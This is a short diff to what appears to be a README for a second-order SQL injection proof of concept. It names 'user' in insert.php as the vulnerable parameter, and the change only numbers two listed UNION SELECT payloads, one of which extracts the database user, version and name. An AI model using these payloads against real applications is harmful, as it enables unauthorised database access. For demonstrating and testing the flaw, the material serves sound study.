@@ -8,6 +8,6 @@ This is a POC for Second Order SQL Injection
  
  Attack: 
   vunerable parameter (insert.php) - user
-  Payload: X' UNION SELECT user(),version(),database(), 4 -- 
-  Palyoad:  X' UNION SELECT 1,2,3,4 -- 
+  1. Payload: X' UNION SELECT user(),version(),database(), 4 -- 
+  2. Palyoad:  X' UNION SELECT 1,2,3,4 -- 
   
